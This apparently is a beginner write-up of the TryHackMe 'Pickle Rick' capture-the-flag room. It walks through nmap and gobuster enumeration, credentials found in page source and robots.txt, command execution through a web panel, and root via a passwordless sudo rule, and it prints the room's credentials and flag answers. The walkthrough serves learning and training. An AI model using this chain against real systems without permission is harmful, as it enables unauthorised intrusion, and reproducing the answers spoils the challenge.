# 🥒 Pickle Rick - TryHackMe Writeup

## Objective

Help Rick transform back into a human by locating the three secret ingredients hidden on the target machine.

---

## Initial Enumeration

The first step was identifying the services running on the target.

```bash
nmap -sC -sV <TARGET_IP>
```

### Result

The scan revealed:

```text
22/tcp  open  ssh
80/tcp  open  http
```

Since the challenge revolves around a web application, I focused on port 80.

---

## Website Enumeration

Opening the target IP in the browser displayed a Rick and Morty themed webpage.

Before doing anything else, I inspected the page source.

### View Source

```html
Username: R1ckRul3s
```

### Observation

A username was exposed within the HTML source code.

```text
R1ckRul3s
```

This would likely be useful later during authentication.

---

## Discovering Hidden Files

Next, I checked for common hidden files.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

### robots.txt

Navigating to:

```text
http://<TARGET_IP>/robots.txt
```

revealed:

```text
Wubbalubbadubdub
```

### Observation

This appeared to be a password.

At this stage I had:

```text
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

---

## Finding the Login Page

To locate additional directories and files, I performed directory enumeration.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Result

A login page was discovered:

```text
/login.php
```

---

## Login

Using the credentials discovered earlier:

```text
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

I successfully authenticated and gained access to a command execution panel.

---

## Command Injection

The panel accepted system commands directly.

To verify command execution:

```bash
whoami
```

### Result

```text
www-data
```

This confirmed command injection and remote code execution.

---

# First Ingredient

After obtaining command execution, I started enumerating the system.

```bash
ls
```

A file containing the first ingredient was discovered.

```bash
cat "Sup3rS3cretPickl3Ingred.txt"
```

### First Ingredient

```text
mr. meeseek hair
```

---

# Second Ingredient

While browsing the filesystem, I noticed that some directories could not be accessed directly due to permissions.

To locate the next ingredient:

```bash
find / -type f 2>/dev/null
```

A file belonging to Rick was identified.

Reading the file revealed the second ingredient.

### Second Ingredient

```text
1 jerry tear
```

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

### Result

```text
(ALL) NOPASSWD: ALL
```

The current user could execute commands as root without providing a password.

To obtain a root shell:

```bash
sudo bash
```

Verification:

```bash
whoami
```

Output:

```text
root
```

---

# Third Ingredient

Now with root privileges, I navigated to the root directory.

```bash
cd /root
ls
```

A final ingredient file was present.

```bash
cat 3rd.txt
```

### Third Ingredient

```text
fleeb juice
```

---

# Ingredients Collected

### Ingredient 1

```text
mr. meeseek hair
```

### Ingredient 2

```text
1 jerry tear
```

### Ingredient 3

```text
fleeb juice
```

---

## Commands Used

```bash
nmap -sC -sV <TARGET_IP>

gobuster dir -u http://<TARGET_IP> -w wordlist.txt

whoami

ls

find / -type f 2>/dev/null

sudo -l

sudo bash
```

---

## Key Takeaways

* Always inspect page source code during web enumeration.
* Check common files such as robots.txt.
* Directory brute-forcing can reveal hidden functionality.
* Command injection can lead to full system compromise.
* Misconfigured sudo permissions are a common privilege escalation vector.
* Enumeration is often more important than exploitation.

---

## Conclusion

Pickle Rick is an excellent beginner-friendly challenge that introduces web enumeration, hidden file discovery, command injection, and basic Linux privilege escalation. By chaining together information gathered from the website, hidden files, and system enumeration, it was possible to recover all three ingredients and complete the room.

